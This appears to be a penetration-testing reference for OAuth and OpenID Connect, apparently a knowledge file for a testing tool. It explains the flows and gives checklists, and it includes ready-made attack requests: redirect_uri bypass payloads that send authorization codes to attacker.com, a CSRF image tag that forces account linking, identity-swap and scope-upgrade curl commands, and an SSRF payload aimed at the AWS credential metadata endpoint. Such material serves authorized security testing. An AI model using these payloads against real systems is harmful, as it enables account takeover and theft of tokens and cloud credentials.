---
id: PS-OAUTH
category: OAuth authentication
lab_count: 6
wstg_refs: [WSTG-ATHZ-05]
---

# OAuth: Attack Technique Reference

OAuth 2.0 delegates authentication and authorization to a third-party provider. The client application redirects the user to the OAuth provider, the user authenticates and grants permissions, and the provider returns an authorization code or access token to the client. Attacks exploit weaknesses in how the client application and OAuth provider validate redirect URIs, enforce state parameters, handle token exchange, and manage scopes. Because OAuth involves multiple parties and redirect-based flows, there are many points where validation gaps enable account takeover, token theft, and privilege escalation.

---

## 1. Detection

### 1A. Identify OAuth Usage

Look for OAuth-related indicators during reconnaissance:

```bash
# Check for OAuth/OIDC login redirects
curl -sk -D- -o /dev/null -L https://target.com/login 2>&1 | grep -i 'location:'

# Look for social login buttons in page source
curl -sk https://target.com/login | grep -iE 'oauth|openid|social|google|facebook|github|login.*with'

# Check for OIDC discovery endpoint on the OAuth provider
curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq .
curl -sk https://oauth-provider.com/.well-known/oauth-authorization-server | jq .
```

**OAuth indicators in HTTP traffic:**
- Authorization redirect: `GET /auth?client_id=...&redirect_uri=...&response_type=code&scope=...&state=...`
- Callback with code: `GET /callback?code=AUTH_CODE&state=STATE_VALUE`
- Callback with token (implicit): `GET /callback#access_token=TOKEN&token_type=bearer`
- Token exchange: `POST /token` with `grant_type=authorization_code&code=...&client_secret=...`

### 1B. Determine the Grant Type

The `response_type` parameter in the authorization request reveals the flow:

| response_type | Grant Type | Token Delivery | Security Level |
|---------------|-----------|---------------|----------------|
| `code` | Authorization Code | Server-to-server exchange | Higher (secret stays server-side) |
| `token` | Implicit | URL fragment in browser | Lower (token exposed in browser) |
| `code token` | Hybrid | Both code and token | Mixed |

### 1C. Map OAuth Parameters

For each OAuth flow, document:

```bash
# Capture the full authorization URL
curl -sk -D- https://target.com/login/oauth 2>&1 | grep -i 'location:' | head -1
```

Record:
- **client_id**: Identifies the client application
- **redirect_uri**: Where the provider sends the user back (primary attack target)
- **scope**: Permissions requested (e.g., `openid profile email`)
- **state**: Anti-CSRF nonce (if absent, CSRF is likely possible)
- **response_type**: `code` or `token`
- **response_mode**: `query`, `fragment`, or `form_post`
- **code_challenge / code_challenge_method**: PKCE parameters (if present, PKCE is enforced)

### 1D. Check for OpenID Connect

OpenID Connect extends OAuth with an ID token (JWT) and standardized endpoints:

```bash
# OIDC discovery
curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq '{
  authorization_endpoint, token_endpoint, userinfo_endpoint,
  registration_endpoint, jwks_uri,
  grant_types_supported, response_types_supported,
  scopes_supported
}'
```

If `registration_endpoint` is present, dynamic client registration may be possible (see technique 2F).

---

## 2. Techniques

### 2A. Implicit Grant Token Theft via Manipulated Credentials

In the implicit grant flow, the OAuth provider sends the access token directly to the client application via a URL fragment. The client then submits the token and user data (email, username) to its own server. If the server does not independently verify that the access token belongs to the submitted user data, an attacker can swap the user details while keeping a valid token.

**Steps:**
1. Complete a legitimate OAuth implicit flow with an attacker account
2. Intercept the POST request where the client submits the token and user data to its own backend
3. Keep the valid `access_token` but change the `email` or `username` to the victim's
4. The server accepts the token (it is valid) and logs the attacker in as the victim (it trusts the submitted user data)

```bash
# Intercept and modify the token submission
curl -sk -X POST https://target.com/authenticate \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "victim@target.com",
    "username": "victim",
    "token": "ATTACKER_VALID_ACCESS_TOKEN"
  }'
```

**Root cause:** The client application does not call the OAuth provider's `/userinfo` endpoint to verify which user the token actually belongs to.

> Lab refs: PS-OAUTH-01

### 2B. Forced OAuth Profile Linking (CSRF on OAuth Attach)

When a user can link their account to an OAuth provider (e.g., "Connect with social media"), the OAuth flow produces an authorization code. If the `state` parameter is missing or not validated, an attacker can initiate the OAuth flow with their own account, intercept the authorization code before it is consumed, and trick the victim into using it -- linking the attacker's OAuth identity to the victim's account.

**Steps:**
1. Attacker initiates the "Link social account" flow on the target application
2. After authenticating with the OAuth provider, intercept the callback URL containing the authorization code: `https://target.com/oauth/callback?code=ATTACKER_CODE`
3. Do NOT follow this redirect -- save the URL
4. Deliver this URL to the victim (via social engineering, email, embedded in an img tag, etc.)
5. When the victim's browser visits the URL, their authenticated session on the target application consumes the code
6. The attacker's OAuth account is now linked to the victim's target account
7. The attacker can now log in to the victim's account via the OAuth "Login with social" flow

```html
<!-- Deliver via CSRF: force victim to visit the attacker's callback URL -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE" />
```

**Root cause:** Missing or unvalidated `state` parameter in the OAuth authorization request.

**Detection:** Initiate an OAuth flow and check if `state` is present in the authorization URL. If absent, or if removing `state` from the callback still works, the application is vulnerable.

> Lab refs: PS-OAUTH-03

### 2C. redirect_uri Manipulation for Code/Token Theft

The `redirect_uri` parameter specifies where the OAuth provider sends the authorization code or access token. If the provider does not strictly validate this parameter, the attacker can redirect the code/token to their own server.

**Steps:**
1. Capture a legitimate authorization request and note the `redirect_uri`
2. Modify `redirect_uri` to an attacker-controlled URL
3. If the OAuth provider accepts the modified URI, the authorization code or access token is sent to the attacker
4. The attacker uses the stolen code to complete the OAuth flow and gain access to the victim's account

**Bypass techniques when the provider partially validates:**

```
# Exact match bypass - try variations
redirect_uri=https://target.com/callback                     # original
redirect_uri=https://target.com/callback/../other-page       # path traversal
redirect_uri=https://target.com/callback?extra=param         # extra parameters
redirect_uri=https://target.com/callback%23@attacker.com     # fragment injection
redirect_uri=https://target.com.attacker.com/callback        # subdomain confusion
redirect_uri=https://attacker.com?target.com                 # domain in query string

# URL parsing confusion
redirect_uri=https://target.com@attacker.com                 # userinfo field
redirect_uri=https://target.com%40attacker.com               # encoded @
redirect_uri=https://target.com%0d%0a@attacker.com           # CRLF + userinfo

# Localhost/development URIs
redirect_uri=http://localhost:1234/callback                   # dev URI left allowed
redirect_uri=http://localhost.attacker.com/callback           # subdomain trick

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
```

```bash
# Test redirect_uri validation by modifying the authorization URL
curl -sk -D- "https://oauth-provider.com/auth?client_id=TARGET_CLIENT_ID&redirect_uri=https://attacker.com/steal&response_type=code&scope=openid" | grep 'location:'
```

If the provider redirects to `attacker.com` with a code, the validation is broken.

> Lab refs: PS-OAUTH-04, PS-OAUTH-05

### 2D. Code/Token Theft via Open Redirect Proxy

When direct `redirect_uri` manipulation fails because the provider strictly validates the domain, find an open redirect or path traversal on the allowed domain. Use it as a relay to forward the code/token to the attacker.

**Steps:**
1. Confirm `redirect_uri` is strictly validated to `https://target.com/callback`
2. Find an open redirect elsewhere on `target.com` (e.g., `/post/next?path=...`)
3. Use path traversal in `redirect_uri` to reach the open redirect, which then forwards to the attacker

```
# Path traversal to open redirect
redirect_uri=https://target.com/oauth/callback/../post/next?path=https://attacker.com/steal
```

**For implicit flow:** The access token travels in the URL fragment (`#access_token=...`). Fragments are not sent in HTTP requests by default, but they ARE forwarded during same-origin redirects. Chain an open redirect to leak the fragment:

```
redirect_uri=https://target.com/oauth/callback/../redirect?url=https://attacker.com/steal
```

**For authorization code flow:** The code travels in the query string (`?code=...`) and is forwarded through redirects normally. Additionally, the code is leaked in the Referer header if the callback page loads external resources.

> Lab refs: PS-OAUTH-05, PS-OAUTH-06

### 2E. Scope Upgrade Attacks

The OAuth scope defines what permissions the access token grants. If scope validation is weak, the attacker can elevate their privileges beyond what was originally authorized.

**Authorization code flow -- scope manipulation at token exchange:**
```bash
# Original token exchange
curl -sk -X POST https://oauth-provider.com/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID&client_secret=SECRET&redirect_uri=CALLBACK"

# Modified: add elevated scope to the token exchange
curl -sk -X POST https://oauth-provider.com/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID&client_secret=SECRET&redirect_uri=CALLBACK&scope=openid+profile+email+admin"
```

**Implicit flow -- scope manipulation at authorization:**
```
# Original authorization request
https://oauth-provider.com/auth?client_id=X&response_type=token&scope=openid+profile

# Modified: request elevated scope
https://oauth-provider.com/auth?client_id=X&response_type=token&scope=openid+profile+email+admin
```

**Scope upgrade via direct API call:**
After obtaining a valid access token (even with limited scope), try accessing elevated endpoints directly:
```bash
curl -sk https://oauth-provider.com/userinfo \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -d "scope=openid+profile+email+admin"
```

> Lab refs: (scope concepts demonstrated across multiple labs)

### 2F. Unprotected Dynamic Client Registration

OpenID Connect providers may expose a `/registration` endpoint that allows anyone to register a new OAuth client application. If this endpoint has no authentication or rate limiting, an attacker can register a malicious client with a crafted `redirect_uri`.

**Steps:**
1. Check if the OIDC provider supports dynamic registration:
   ```bash
   curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq '.registration_endpoint'
   ```
2. Register a new client with an attacker-controlled `redirect_uri`:
   ```bash
   curl -sk -X POST https://oauth-provider.com/registration \
     -H 'Content-Type: application/json' \
     -d '{
       "redirect_uris": ["https://attacker.com/callback"],
       "application_type": "web",
       "client_name": "Legitimate App"
     }'
   ```
3. The response includes `client_id` and possibly `client_secret`
4. Use the registered client to initiate OAuth flows that redirect tokens to the attacker

**SSRF via registration metadata:**
Registration endpoints may fetch URLs from fields like `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris`, or `policy_uri`. These can be abused for SSRF:

```bash
curl -sk -X POST https://oauth-provider.com/registration \
  -H 'Content-Type: application/json' \
  -d '{
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# If the server fetches logo_uri, the response may contain AWS metadata
# Check the registered client's logo endpoint or error messages for leaked data
```

> Lab refs: PS-OAUTH-02

### 2G. Unverified User Registration on OAuth Provider

Some OAuth providers allow registration with any email address without verification. An attacker registers an account on the OAuth provider using the victim's email address, then uses "Login with OAuth" on the target application. If the target matches users by email, the attacker gains access to the victim's account.

**Steps:**
1. Register on the OAuth provider (e.g., social media) using the victim's email
2. Navigate to the target application and choose "Login with [OAuth provider]"
3. The OAuth provider returns the victim's email in the user profile
4. The target application matches this email to the existing victim account
5. The attacker is logged in as the victim

**Detection:** Check if the OAuth provider verifies email ownership. Check if the target application verifies that the OAuth account's email is confirmed (look for `email_verified` claim in OIDC).

---

## 3. OAuth Flow Reference

### 3A. Authorization Code Flow (Server-Side Applications)

```
1. User clicks "Login with OAuth" on client application
   → Browser redirects to:
   GET https://oauth-provider.com/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://target.com/callback
     &response_type=code
     &scope=openid profile email
     &state=RANDOM_NONCE

2. User authenticates at OAuth provider and grants consent

3. OAuth provider redirects browser back to client:
   GET https://target.com/callback
     ?code=AUTHORIZATION_CODE
     &state=RANDOM_NONCE

4. Client server exchanges code for token (server-to-server, invisible to user):
   POST https://oauth-provider.com/token
   Content-Type: application/x-www-form-urlencoded

   grant_type=authorization_code
   &code=AUTHORIZATION_CODE
   &client_id=CLIENT_ID
   &client_secret=CLIENT_SECRET
   &redirect_uri=https://target.com/callback

5. OAuth provider returns access token (and optionally ID token):
   {"access_token": "TOKEN", "token_type": "bearer", "id_token": "JWT..."}

6. Client fetches user info:
   GET https://oauth-provider.com/userinfo
   Authorization: Bearer TOKEN

7. OAuth provider returns user profile:
   {"sub": "user123", "email": "user@example.com", "name": "User"}
```

**Attack surface:** Steps 1 (redirect_uri, state), 3 (code interception), 4 (scope manipulation), 6-7 (token validation).

### 3B. Implicit Flow (Client-Side Applications)

```
1. Browser redirects to:
   GET https://oauth-provider.com/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://target.com/callback
     &response_type=token
     &scope=openid profile email
     &state=RANDOM_NONCE

2. User authenticates and grants consent

3. OAuth provider redirects with token in URL fragment:
   GET https://target.com/callback
     #access_token=TOKEN
     &token_type=bearer
     &expires_in=3600
     &state=RANDOM_NONCE

4. Client-side JavaScript extracts token from fragment

5. Client submits token to its own backend or uses it for API calls
```

**Attack surface:** Steps 1 (redirect_uri, state), 3 (fragment leakage via open redirect), 5 (token/identity substitution).

### 3C. PKCE Extension

PKCE (Proof Key for Code Exchange) prevents authorization code interception by binding the code to the client that initiated the flow:

```
1. Client generates random code_verifier and derives code_challenge:
   code_challenge = BASE64URL(SHA256(code_verifier))

2. Authorization request includes code_challenge:
   GET /auth?...&code_challenge=CHALLENGE&code_challenge_method=S256

3. Token exchange includes code_verifier:
   POST /token ... &code_verifier=VERIFIER

4. Server verifies: SHA256(code_verifier) == code_challenge
```

**Testing PKCE:** Remove `code_challenge` from the authorization request. If the flow still works, PKCE is not enforced and code interception attacks (2C, 2D) remain viable.

### 3D. OpenID Connect Differences

OpenID Connect builds on OAuth 2.0 and adds:
- **ID Token:** A JWT containing identity claims, returned alongside the access token
- **UserInfo endpoint:** Standardized endpoint for fetching user profile data
- **Discovery:** `/.well-known/openid-configuration` for automatic configuration
- **Dynamic registration:** `/registration` endpoint for programmatic client setup
- **Standard scopes:** `openid`, `profile`, `email`, `address`, `phone`

---

## 4. Testing Checklist

For every application using OAuth, execute this systematic test sequence:

```
OAuth flow detected?
├── Step 1: Identify grant type and map all parameters
│   ├── Authorization code flow → test code interception, state, redirect_uri
│   └── Implicit flow → test token theft, identity substitution
│
├── Step 2: Test state parameter (CSRF protection)
│   ├── Is state present in authorization request?
│   │   ├── NO → Forced OAuth linking possible (2B)
│   │   └── YES → Remove state from callback, does it still work?
│   │       ├── YES → State not validated, CSRF possible (2B)
│   │       └── NO → State properly enforced
│   └── Is state unique per request and tied to the session?
│
├── Step 3: Test redirect_uri validation
│   ├── Change redirect_uri to attacker domain → Accepted? (2C)
│   ├── Add path traversal: /callback/../other → Accepted?
│   ├── Add extra parameter: /callback?extra=val → Accepted?
│   ├── Subdomain: target.com.attacker.com → Accepted?
│   ├── Parameter pollution: two redirect_uri params → Which is used?
│   └── If strictly validated → Look for open redirect on allowed domain (2D)
│
├── Step 4: Test scope enforcement (2E)
│   ├── Add elevated scopes to authorization request
│   ├── Add scopes to token exchange request
│   └── Call restricted API endpoints with limited-scope token
│
├── Step 5: Test implicit flow identity verification (2A)
│   ├── Intercept token submission to client backend
│   ├── Swap user identity fields (email, username) while keeping valid token
│   └── Does the server verify token ownership against submitted identity?
│
├── Step 6: Test dynamic client registration (2F)
│   ├── Check for registration_endpoint in OIDC discovery
│   ├── Attempt unauthenticated client registration
│   └── Test SSRF via logo_uri, jwks_uri, sector_identifier_uri
│
├── Step 7: Test PKCE enforcement
│   ├── Remove code_challenge from authorization request
│   └── If flow works without PKCE → Code interception viable
│
├── Step 8: Test token storage and transmission
│   ├── Is the access token stored in localStorage? (XSS → token theft)
│   ├── Is the token transmitted in URL parameters? (Referer leakage)
│   └── Is the token in a Secure, HttpOnly cookie? (Safest)
│
└── Step 9: Check email verification
    ├── Does the OAuth provider verify email ownership?
    ├── Does the client check email_verified claim?
    └── Can an attacker register with victim's email on provider? (2G)
```

### Per-Step Verification Commands

```bash
# 1. Capture OAuth authorization redirect
curl -sk -D- https://target.com/login/oauth 2>&1 | grep -i 'location:'

# 2. Test without state parameter
curl -sk -D- "https://target.com/callback?code=VALID_CODE" \
  -H "Cookie: session=VICTIM_SESSION"

# 3. Test redirect_uri to attacker domain
curl -sk -D- "https://oauth-provider.com/auth?client_id=CLIENT_ID&redirect_uri=https://attacker.com/steal&response_type=code&scope=openid" | grep 'location:'

# 4. Test scope upgrade at token exchange
curl -sk -X POST https://oauth-provider.com/token \
  -d "grant_type=authorization_code&code=CODE&client_id=CLIENT_ID&client_secret=SECRET&redirect_uri=CALLBACK&scope=openid+admin"

# 5. Test identity substitution (implicit flow)
curl -sk -X POST https://target.com/authenticate \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@target.com","token":"ATTACKER_TOKEN"}'

# 6. Test dynamic client registration
curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq '.registration_endpoint'
curl -sk -X POST https://oauth-provider.com/registration \
  -H 'Content-Type: application/json' \
  -d '{"redirect_uris":["https://attacker.com/callback"]}'

# 7. Test PKCE enforcement -- remove code_challenge from auth URL
# Compare responses with and without code_challenge parameter
```

---

## 5. Quick Reference: OAuth Attack Decision Tree

```
OAuth/OIDC flow detected?
├── Implicit grant (response_type=token)?
│   ├── Does client verify token ownership at /userinfo?
│   │   ├── NO → Identity substitution (2A) → Account takeover
│   │   └── YES → Try redirect_uri manipulation for token theft
│   └── Is there an open redirect on the allowed domain?
│       ├── YES → Chain open redirect to leak fragment token (2D)
│       └── NO → Fragment-based theft not directly possible
│
├── Authorization code grant (response_type=code)?
│   ├── Is state parameter present and validated?
│   │   ├── NO → Forced OAuth linking / CSRF (2B)
│   │   └── YES → State properly enforced
│   ├── Is redirect_uri strictly validated?
│   │   ├── NO → Direct code theft to attacker domain (2C)
│   │   └── YES → Find open redirect proxy on target (2D)
│   ├── Is PKCE enforced?
│   │   ├── NO → Code interception viable (2C, 2D)
│   │   └── YES → Code alone is not sufficient
│   └── Can scope be upgraded at token exchange? (2E)
│
├── OpenID Connect features?
│   ├── Dynamic registration endpoint exposed?
│   │   ├── YES → Register malicious client (2F)
│   │   └── YES → Test SSRF via metadata URLs (2F)
│   └── Email verification enforced?
│       ├── NO → Register on provider with victim's email (2G)
│       └── YES → Email-based attacks blocked
│
└── General checks (all flows)
    ├── Token in localStorage → XSS leads to token theft
    ├── Token in URL params → Referer header leakage
    └── Client secret exposed in frontend JS → Full flow compromise
```
## Rynix workflow

1. `get_technique_guide` for `oauth` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `auth_login`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `auth_login`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

